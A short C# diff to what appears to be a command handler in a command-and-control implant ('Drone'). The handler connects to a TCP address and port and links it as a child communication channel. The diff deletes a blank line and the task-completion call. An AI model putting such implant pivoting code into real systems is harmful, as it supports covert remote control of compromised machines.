@@ -14,10 +14,8 @@ public sealed class Connect : DroneCommand
     {
         var address = task.Arguments[0];
         var port = int.Parse(task.Arguments[1]);
-
         var commModule = new TcpCommModule(address, port);
         
         await Drone.AddChildCommModule(task.Id, commModule);
-        await Drone.SendTaskComplete(task.Id);
     }
 }
